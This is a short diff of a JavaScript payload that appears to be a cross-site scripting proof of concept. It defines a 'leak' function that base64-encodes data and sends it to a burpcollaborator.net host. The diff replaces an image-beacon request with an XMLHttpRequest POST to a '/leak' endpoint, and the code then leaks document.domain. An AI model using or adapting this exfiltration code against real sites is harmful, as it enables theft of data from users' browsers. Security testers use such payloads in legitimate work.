@@ -1,8 +1,10 @@
 leak = function(name, data)
 {
-   var i = document.createElement('img');
-   i.src = "https://yxz1eqvtp27ov7r4y4qdkmmyqpwqkf.burpcollaborator.net?" + name + "=" + btoa(data);
-   document.body.appendChild(i);	
+   var XHR = new XMLHttpRequest();
+   var FD  = new FormData();
+   FD.append(name, btoa(data));
+   XHR.open('POST', 'https://3676nv4yy7gt4c0979zitrv3zu5wtl.burpcollaborator.net/leak');
+   XHR.send(FD);   
 }
 
 leak("document.domain",document.domain);
